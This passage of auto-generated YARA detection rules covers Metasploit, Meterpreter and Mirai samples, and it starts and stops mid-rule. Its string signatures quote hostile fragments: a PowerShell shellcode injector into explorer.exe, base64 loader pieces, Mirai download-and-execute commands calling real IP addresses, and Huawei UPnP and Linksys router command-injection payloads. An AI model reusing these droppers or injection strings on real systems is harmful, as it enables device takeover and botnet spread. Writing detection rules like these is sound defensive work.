      $s10 = "JABSAD0AewAkAEQALAAkAEsAPQAkAEEAUgBnAFMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0A" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s11 = "cgBJAE4AZwBdACkAKQB9ACQAUgBlAEYAPQBbAFIAZQBGAF0ALgBBAFMAcwBFAE0AYgBMAFkALgBHAGUAVABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEA" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s12 = "XQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwA" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s13 = "UABSAG8AWABZADsAJAA0ADYAZAAuAFAAUgBvAFgAWQAuAEMAcgBlAGQAZQBOAFQASQBBAEwAUwAgAD0AIABbAFMAeQBTAHQAZQBtAC4ATgBFAFQALgBDAFIARQBEAEUA" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s14 = "fQAkAFYAQQBMAD0AWwBDAG8AbABMAEUAQwB0AEkAbwBOAHMALgBHAGUATgBFAFIAaQBjAC4ARABpAEMAVABJAG8ATgBhAFIAeQBbAFMAdAByAGkAbgBHACwAUwBZAFMA" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s15 = "OgBFAHgAUABlAEMAVAAxADAAMABDAE8ATgB0AGkATgBVAGUAPQAwADsAJAA0ADYAZAA9AE4AZQBXAC0ATwBiAEoARQBjAHQAIABTAFkAcwB0AEUAbQAuAE4ARQB0AC4A" ascii /* base64 encoded string */ /* score: '21.00'*/
   condition:
      uint16(0) == 0x2023 and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule Metasploit_signature__3 {
   meta:
      description = "_subset_batch - file Metasploit(signature).ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c8860f4c4a3beb187f25b832af02a6082332065126754ab1b748462707513f78"
   strings:
      $s1 = "$res = [Win32.Native]::WriteProcessMemory($hProc, $remoteBuf, $Shellcode, $memSize, [ref]$outBytes)" fullword ascii /* score: '26.00'*/
      $s2 = "<#  -----------------  InjectToExplorer.ps1  -----------------" fullword ascii /* score: '26.00'*/
      $s3 = " shellcode " fullword ascii /* score: '23.00'*/
      $s4 = "Write-Host \"Shellcode " fullword ascii /* score: '23.00'*/
      $s5 = "public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);" fullword ascii /* score: '21.00'*/
      $s6 = " shellcode (x64) " fullword ascii /* score: '21.00'*/
      $s7 = ": PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_LIMITED_INFORMATION" fullword ascii /* score: '20.00'*/
      $s8 = "$tpid = (Get-Process explorer)[0].Id" fullword ascii /* score: '20.00'*/
      $s9 = " explorer.exe" fullword ascii /* score: '19.00'*/
      $s10 = "[Byte[]] $Shellcode = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x65,0x48,0x8b,0x" ascii /* score: '18.00'*/
      $s11 = "if (-not $res) { throw \"WriteProcessMemory failed\" }" fullword ascii /* score: '18.00'*/
      $s12 = "public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress," fullword ascii /* score: '18.00'*/
      $s13 = "[Byte[]] $Shellcode = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x65,0x48,0x8b,0x" ascii /* score: '18.00'*/
      $s14 = "public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes," fullword ascii /* score: '18.00'*/
      $s15 = "$memSize = $Shellcode.Length" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x233c and filesize < 10KB and
      8 of them
}

rule Meterpreter_signature__b4c6fff030479aa3b12625be67bf4914_imphash__21a9a414 {
   meta:
      description = "_subset_batch - file Meterpreter(signature)_b4c6fff030479aa3b12625be67bf4914(imphash)_21a9a414.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "21a9a414a0f76a93aaa20b2d9c7ffe3f48b5bca29a7c96d56cea5f105ac7afec"
   strings:
      $s1 = "PAYLOAD:" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20KB and
      all of them
}

rule Meterpreter_signature__b4c6fff030479aa3b12625be67bf4914_imphash__6c5e4dfd {
   meta:
      description = "_subset_batch - file Meterpreter(signature)_b4c6fff030479aa3b12625be67bf4914(imphash)_6c5e4dfd.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6c5e4dfd7a4e71750357a39aada7ace7e3a191ee047369fd3f7bd4881a4f117d"
   strings:
      $s1 = "PAYLOAD:" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20KB and
      all of them
}

rule Meterpreter_signature__b4c6fff030479aa3b12625be67bf4914_imphash__c9ccd4c8 {
   meta:
      description = "_subset_batch - file Meterpreter(signature)_b4c6fff030479aa3b12625be67bf4914(imphash)_c9ccd4c8.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c9ccd4c85f38261d3f7c0f97c3adb9a1dbe1e56c81503a92d8957c20e41e72b8"
   strings:
      $s1 = "PAYLOAD:" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20KB and
      all of them
}

rule Meterpreter_signature__b4c6fff030479aa3b12625be67bf4914_imphash_ {
   meta:
      description = "_subset_batch - file Meterpreter(signature)_b4c6fff030479aa3b12625be67bf4914(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e5673b33660c96d634b936790ee1767cc91736dbb26ae04a07bd0fd773816918"
   strings:
      $s1 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s2 = "PAYLOAD:" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20KB and
      all of them
}

rule Mirai_signature_ {
   meta:
      description = "_subset_batch - file Mirai(signature).elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "245040fb506c6cc7c5b3d103bcdc1ad60cbb7c6c72772f89725b0de8a3f1ce3a"
   strings:
      $s1 = "Kill bypass attempt" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__056c6982 {
   meta:
      description = "_subset_batch - file Mirai(signature)_056c6982.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "056c69825f41a2c62f3e14c6682b001b1810a0cda55967c725a7a630ebb24515"
   strings:
      $s1 = "Kill bypass attempt" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__00e63df7 {
   meta:
      description = "_subset_batch - file Mirai(signature)_00e63df7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "00e63df73a3ce195cc2bf2b8e1207e7de4827e072eed80ab9606bbb6f5c4f289"
   strings:
      $s1 = "Kill bypass attempt" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__03eaf873 {
   meta:
      description = "_subset_batch - file Mirai(signature)_03eaf873.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "03eaf8733eaea56e9372fcc4d0a76cab97cb81b598b984b100ad516920e1e6dd"
   strings:
      $s1 = "Kill bypass attempt" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__0adaa4ef {
   meta:
      description = "_subset_batch - file Mirai(signature)_0adaa4ef.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0adaa4ef0d08201a6053222671600fa118a54529a9fc5fa10fbf88555f8f7d31"
   strings:
      $s1 = "Kill bypass attempt" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__0c6436ef {
   meta:
      description = "_subset_batch - file Mirai(signature)_0c6436ef.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0c6436efbd4bb779f25329dad06bf22634c7184d0ca2b02f9362671831f95760"
   strings:
      $s1 = "Kill bypass attempt" fullword ascii /* score: '22.00'*/
      $s2 = "%s: '%s' is not an ELF executable for ARM" fullword ascii /* score: '17.50'*/
      $s3 = "R_ARM_PC24: Compile shared libraries with -fPIC!" fullword ascii /* score: '16.00'*/
      $s4 = "Unable to process RELA relocs" fullword ascii /* score: '15.00'*/
      $s5 = "%s: '%s' library contains unsupported TLS" fullword ascii /* score: '12.50'*/
      $s6 = "Header check failed" fullword ascii /* score: '12.00'*/
      $s7 = "exec_unnamed" fullword ascii /* score: '12.00'*/
      $s8 = "%s: '%s' has more than one dynamic section" fullword ascii /* score: '9.50'*/
      $s9 = "%s: '%s' is missing a dynamic section" fullword ascii /* score: '9.50'*/
      $s10 = "Unable to open /dev/zero" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__0c6f64ff {
   meta:
      description = "_subset_batch - file Mirai(signature)_0c6f64ff.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0c6f64fff5c646f1ebcc601d50cf9ada2bc63119ccdfc45f969b07f71bb329f7"
   strings:
      $s1 = "Kill bypass attempt" fullword ascii /* score: '22.00'*/
      $s2 = "%s: '%s' is not an ELF executable for m68k" fullword ascii /* score: '17.50'*/
      $s3 = "Unable to process REL relocs" fullword ascii /* score: '15.00'*/
      $s4 = "Header check failed" fullword ascii /* score: '12.00'*/
      $s5 = "exec_unnamed" fullword ascii /* score: '12.00'*/
      $s6 = "%s: '%s' has more than one dynamic section" fullword ascii /* score: '9.50'*/
      $s7 = "%s: '%s' is missing a dynamic section" fullword ascii /* score: '9.50'*/
      $s8 = "Unable to open /dev/zero" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__0dca5d0f {
   meta:
      description = "_subset_batch - file Mirai(signature)_0dca5d0f.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0dca5d0fd3a9b500c4fc8c19a1e5aba9c121bf760d042cf07f2369b7ecb8e6f9"
   strings:
      $s1 = "Kill bypass attempt" fullword ascii /* score: '22.00'*/
      $s2 = "%s: '%s' is not an ELF executable for MIPS" fullword ascii /* score: '17.50'*/
      $s3 = "Unable to process RELA relocs" fullword ascii /* score: '15.00'*/
      $s4 = "exec_unnamed" fullword ascii /* score: '12.00'*/
      $s5 = "%s: '%s' has more than one dynamic section" fullword ascii /* score: '9.50'*/
      $s6 = "%s: '%s' is missing a dynamic section" fullword ascii /* score: '9.50'*/
      $s7 = "#$%&'()*+,234567" fullword ascii /* score: '9.00'*/ /* hex encoded string '#Eg' */
      $s8 = "Unable to open /dev/zero" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__02e79540 {
   meta:
      description = "_subset_batch - file Mirai(signature)_02e79540.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "02e795405eacea1d81fd6f1eef2628992c9b267d2a86f0e4ba84240d3ce9b7b4"
   strings:
      $s1 = " POST /cdn-cgi/" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__0bbca6a1 {
   meta:
      description = "_subset_batch - file Mirai(signature)_0bbca6a1.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0bbca6a145b081e696ef778054cf7f172cdd3a40fd844149ed063e2d7224195f"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '43.00'*/
      $s2 = "76.65.148.18 -l /tmp/bigH -r /bins/mips;chmod 777 /tmp/bigH;/tmp/bigH huawei.rep.mips;rm -rf /tmp/bigH)</NewStatusURL><NewDownlo" ascii /* score: '26.00'*/
      $s3 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(busybox wget -" ascii /* score: '20.00'*/
      $s4 = " POST /tmUnblock.cgi HTTP/1.1" fullword ascii /* score: '19.00'*/
      $s5 = "User-Agent: python-requests/2.20.0" fullword ascii /* score: '17.00'*/
      $s6 = "ttcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+mpsl%3B+wget+http%3A%2F%2F176.65.148.18%2Fbins%2Fmpsl%3B+chmod+777+mpsl%3B+.%2Fmpsl+linksys%60" ascii /* score: '15.00'*/
      $s7 = "ttcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+mpsl%3B+wget+http%3A%2F%2F176.65.148.18%2Fbins%2Fmpsl%3B+chmod+777+mpsl%3B+.%2Fmpsl+linksys%60" ascii /* score: '15.00'*/
      $s8 = "Host: 1.1.1.1:80" fullword ascii /* score: '14.00'*/
      $s9 = "adURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s10 = "Content-Length: 430" fullword ascii /* score: '9.00'*/
      $s11 = "Content-Length: 227" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__0d5caf1e {
   meta:
      description = "_subset_batch - file Mirai(signature)_0d5caf1e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0d5caf1e1386ac629bd37770bb1d4d62f288e6c47fa42cae98b8ac73736b2647"
   strings:
      $s1 = "/proc/%d/cmdline" fullword ascii /* score: '15.00'*/
      $s2 = "/etc/config/hosts" fullword ascii /* score: '12.00'*/
      $s3 = "systemd" fullword ascii /* score: '11.00'*/
      $s4 = "someoffdeeznuts" fullword ascii /* score: '8.00'*/
      $s5 = "udevadm" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__077fd907 {
   meta:
      description = "_subset_batch - file Mirai(signature)_077fd907.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "077fd907cfd98ec757ef1e2083eae767f377b089ce354c48ac985dd497cda078"
   strings:
      $s1 = "/proc/%d/cmdline" fullword ascii /* score: '15.00'*/
      $s2 = "#$%&'()*+,234567" fullword ascii /* score: '9.00'*/ /* hex encoded string '#Eg' */
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__2 {
   meta:
      description = "_subset_batch - file Mirai(signature).sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f440991169111162433870d090a235dea3d70c73f4deebf90c726e242c1681c6"
   strings:
      $x1 = "cd /tmp; wget http://45.125.66.56/arm; curl -O http://45.125.66.56/arm; ftpget -v 45.125.66.56 arm arm; chmod 777 arm; ./arm mas" ascii /* score: '34.00'*/
      $x2 = "cd /tmp; wget http://45.125.66.56/ppc; curl -O http://45.125.66.56/ppc; ftpget -v 45.125.66.56 ppc ppc; chmod 777 ppc; ./ppc mas" ascii /* score: '34.00'*/
      $x3 = "cd /tmp; wget http://45.125.66.56/spc; curl -O http://45.125.66.56/spc; ftpget -v 45.125.66.56 spc spc; chmod 777 spc; ./spc mas" ascii /* score: '34.00'*/
      $x4 = "cd /tmp; wget http://45.125.66.56/mips; curl -O http://45.125.66.56/mips; ftpget -v 45.125.66.56 mips mips; chmod 777 mips; ./mi" ascii /* score: '31.00'*/
      $x5 = "cd /tmp; wget http://45.125.66.56/i686; curl -O http://45.125.66.56/i686; ftpget -v 45.125.66.56 i686 i686; chmod 777 i686; ./i6" ascii /* score: '31.00'*/
      $x6 = "cd /tmp; wget http://45.125.66.56/i486; curl -O http://45.125.66.56/i486; ftpget -v 45.125.66.56 i486 i486; chmod 777 i486; ./i4" ascii /* score: '31.00'*/
      $x7 = "cd /tmp; wget http://45.125.66.56/mpsl; curl -O http://45.125.66.56/mpsl; ftpget -v 45.125.66.56 mpsl mpsl; chmod 777 mpsl; ./mp" ascii /* score: '31.00'*/
      $x8 = "cd /tmp; wget http://45.125.66.56/arm7; curl -O http://45.125.66.56/arm7; ftpget -v 45.125.66.56 arm7 arm7; chmod 777 arm7; ./ar" ascii /* score: '31.00'*/
      $x9 = "cd /tmp; wget http://45.125.66.56/sh4; curl -O http://45.125.66.56/sh4; ftpget -v 45.125.66.56 sh4 sh4; chmod 777 sh4; ./sh4 mas" ascii /* score: '31.00'*/
      $x10 = "cd /tmp; wget http://45.125.66.56/arm5; curl -O http://45.125.66.56/arm5; ftpget -v 45.125.66.56 arm5 arm5; chmod 777 arm5; ./ar" ascii /* score: '31.00'*/
      $x11 = "cd /tmp; wget http://45.125.66.56/i486; curl -O http://45.125.66.56/i486; ftpget -v 45.125.66.56 i486 i486; chmod 777 i486; ./i4" ascii /* score: '31.00'*/
      $x12 = "cd /tmp; wget http://45.125.66.56/mips; curl -O http://45.125.66.56/mips; ftpget -v 45.125.66.56 mips mips; chmod 777 mips; ./mi" ascii /* score: '31.00'*/
      $x13 = "cd /tmp; wget http://45.125.66.56/ppc; curl -O http://45.125.66.56/ppc; ftpget -v 45.125.66.56 ppc ppc; chmod 777 ppc; ./ppc mas" ascii /* score: '31.00'*/
      $x14 = "cd /tmp; wget http://45.125.66.56/arm6; curl -O http://45.125.66.56/arm6; ftpget -v 45.125.66.56 arm6 arm6; chmod 777 arm6; ./ar" ascii /* score: '31.00'*/
      $x15 = "cd /tmp; wget http://45.125.66.56/mpsl; curl -O http://45.125.66.56/mpsl; ftpget -v 45.125.66.56 mpsl mpsl; chmod 777 mpsl; ./mp" ascii /* score: '31.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 7KB and
      1 of ($x*)
}

rule Mirai_signature__02fe8d9d {
   meta:
      description = "_subset_batch - file Mirai(signature)_02fe8d9d.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "02fe8d9dfabcca6fe7b91f84de86f2aa28757fb03e569acd39d3a9057e0aa06f"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.44.31/hiddenbin/boatnet.ppc; curl -O http://89.213.44." ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.44.31/hiddenbin/boatnet.arm; curl -O http://89.213.44." ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.44.31/hiddenbin/boatnet.arc; curl -O http://89.213.44." ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.44.31/hiddenbin/boatnet.spc; curl -O http://89.213.44." ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.44.31/hiddenbin/boatnet.arc; curl -O http://89.213.44." ascii /* score: '29.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.44.31/hiddenbin/boatnet.spc; curl -O http://89.213.44." ascii /* score: '29.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.44.31/hiddenbin/boatnet.arm; curl -O http://89.213.44." ascii /* score: '29.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.44.31/hiddenbin/boatnet.ppc; curl -O http://89.213.44." ascii /* score: '29.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.44.31/hiddenbin/boatnet.arm5; curl -O http://89.213.44" ascii /* score: '27.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.44.31/hiddenbin/boatnet.x86; curl -O http://89.213.44." ascii /* score: '27.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.44.31/hiddenbin/boatnet.x86_64; curl -O http://89.213." ascii /* score: '27.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.44.31/hiddenbin/boatnet.mpsl; curl -O http://89.213.44" ascii /* score: '27.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.44.31/hiddenbin/boatnet.i686; curl -O http://89.213.44" ascii /* score: '27.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.44.31/hiddenbin/boatnet.m68k; curl -O http://89.213.44" ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.44.31/hiddenbin/boatnet.arm6; curl -O http://89.213.44" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 8KB and
      8 of them
}

rule Mirai_signature__3 {
   meta:
      description = "_subset_batch - file Mirai(signature).unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "91a09a757e3cec9a5cbc239a488444ed9b8c1b2c4f2f50bab42ba52693e79310"
   strings:
      $s1 = "rm -rf spc;/bin/busybox wget http://45.125.66.56/spc; chmod 777 spc; ./spc weed;" fullword ascii /* score: '27.00'*/
      $s2 = "rm -rf arm;/bin/busybox wget http://45.125.66.56/arm; chmod 777 arm; ./arm weed;" fullword ascii /* score: '27.00'*/
      $s3 = "rm -rf arm5;/bin/busybox wget http://45.125.66.56/arm5; chmod 777 arm5; ./arm5 weed;" fullword ascii /* score: '27.00'*/
      $s4 = "rm -rf x86_64;/bin/busybox wget http://45.125.66.56/x86_64; chmod 777 x86_64; ./x86_64 weed;" fullword ascii /* score: '27.00'*/
      $s5 = "rm -rf sh4;/bin/busybox wget http://45.125.66.56/sh4; chmod 777 sh4; ./sh4 weed;" fullword ascii /* score: '27.00'*/
      $s6 = "rm -rf x86;/bin/busybox wget http://45.125.66.56/x86; chmod 777 x86; ./x86 weed;" fullword ascii /* score: '27.00'*/
      $s7 = "rm -rf mips;/bin/busybox wget http://45.125.66.56/mips; chmod 777 mips; ./mips weed;" fullword ascii /* score: '27.00'*/
      $s8 = "rm -rf mpsl;/bin/busybox wget http://45.125.66.56/mpsl; chmod 777 mpsl; ./mpsl weed;" fullword ascii /* score: '27.00'*/
      $s9 = "rm -rf arm6;/bin/busybox wget http://45.125.66.56/arm6; chmod 777 arm6; ./arm6 weed;" fullword ascii /* score: '27.00'*/
      $s10 = "rm -rf ppc;/bin/busybox wget http://45.125.66.56/ppc; chmod 777 ppc; ./ppc weed;" fullword ascii /* score: '27.00'*/
      $s11 = "rm -rf arm7;/bin/busybox wget http://45.125.66.56/arm7; chmod 777 arm7; ./arm7 weed;" fullword ascii /* score: '27.00'*/
      $s12 = "rm -rf mpsl;wget http://45.125.66.56/mpsl; chmod 777 mpsl; ./mpsl weed;" fullword ascii /* score: '24.00'*/
      $s13 = "rm -rf x86_64;wget http://45.125.66.56/x86_64; chmod 777 x86_64; ./x86_64 weed;" fullword ascii /* score: '24.00'*/
      $s14 = "rm -rf arm7;wget http://45.125.66.56/arm7; chmod 777 arm7; ./arm7 weed;" fullword ascii /* score: '24.00'*/
      $s15 = "rm -rf sh4;wget http://45.125.66.56/sh4; chmod 777 sh4; ./sh4 weed;" fullword ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 8KB and
      8 of them
}

rule Mirai_signature__00d422b8 {
   meta:
      description = "_subset_batch - file Mirai(signature)_00d422b8.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "00d422b87c13a11c8ae6f37f0b210207bc9605875cbf372af9f995c6a84ee7d7"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = " -g 109.205.213.5 -l /tmp/.kx -r /resgod.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDownlo" ascii /* score: '20.00'*/
      $s3 = "adURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s4 = "#$%&'()*+,234567" fullword ascii /* score: '9.00'*/ /* hex encoded string '#Eg' */
      $s5 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
      $s6 = "fddldlfb" fullword ascii /* score: '8.00'*/
      $s7 = "assword" fullword ascii /* score: '8.00'*/
      $s8 = "killattk" fullword ascii /* score: '8.00'*/
      $s9 = "htndhfg" fullword ascii /* score: '8.00'*/
      $s10 = "botkill" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__02359fea {
   meta:
      description = "_subset_batch - file Mirai(signature)_02359fea.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "02359fea02d20a63aae3a7601694c4777b452ec9297f2d9187ec0e7defe2d7b1"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = "[DEBUG] Target %d ready: %s:%d" fullword ascii /* score: '26.50'*/
      $s3 = " -g 109.205.213.5 -l /tmp/.kx -r /resgod.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDownlo" ascii /* score: '20.00'*/
      $s4 = "[DEBUG] Starting attack. Duration: %d, Vector: %d, Targets: %d, Options: %d" fullword ascii /* score: '19.50'*/
      $s5 = "[DEBUG] attack_method_udp called with %d targets" fullword ascii /* score: '13.00'*/
      $s6 = "[DEBUG] Attack method finished execution" fullword ascii /* score: '12.00'*/
      $s7 = "adURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s8 = "[DEBUG] Added attack method: %d, Total: %d" fullword ascii /* score: '9.50'*/
      $s9 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
      $s10 = "[DEBUG] Entering flood loop" fullword ascii /* score: '9.00'*/
      $s11 = "fddldlfb" fullword ascii /* score: '8.00'*/
      $s12 = "assword" fullword ascii /* score: '8.00'*/
      $s13 = "killattk" fullword ascii /* score: '8.00'*/
      $s14 = "htndhfg" fullword ascii /* score: '8.00'*/
      $s15 = "botkill" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__0b16012d {
   meta:
      description = "_subset_batch - file Mirai(signature)_0b16012d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0b16012dd73d7ea67e3b450a3a53520ccc25dfcf80308140b16d210bedc0ca9d"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '40.00'*/
      $s2 = "[DEBUG] Target %d ready: %s:%d" fullword ascii /* score: '26.50'*/
      $s3 = " -g 109.205.213.5 -l /tmp/.kx -r /resgod.mips; /bin/busybox chmod +x /tmp/.kx; /tmp/.kx selfrep.huawei)</NewStatusURL><NewDownlo" ascii /* score: '20.00'*/
      $s4 = "[DEBUG] Starting attack. Duration: %d, Vector: %d, Targets: %d, Options: %d" fullword ascii /* score: '19.50'*/
      $s5 = "[DEBUG] attack_method_udp called with %d targets" fullword ascii /* score: '13.00'*/
      $s6 = "[DEBUG] Attack method finished execution" fullword ascii /* score: '12.00'*/
      $s7 = "adURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s8 = "[DEBUG] Added attack method: %d, Total: %d" fullword ascii /* score: '9.50'*/
      $s9 = "#$%&'()*+,234567" fullword ascii /* score: '9.00'*/ /* hex encoded string '#Eg' */
      $s10 = "Content-Length: 440" fullword ascii /* score: '9.00'*/
      $s11 = "[DEBUG] Entering flood loop" fullword ascii /* score: '9.00'*/
      $s12 = "fddldlfb" fullword ascii /* score: '8.00'*/
      $s13 = "assword" fullword ascii /* score: '8.00'*/
      $s14 = "killattk" fullword ascii /* score: '8.00'*/
      $s15 = "htndhfg" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__01401d5c {
   meta:
      description = "_subset_batch - file Mirai(signature)_01401d5c.elf"
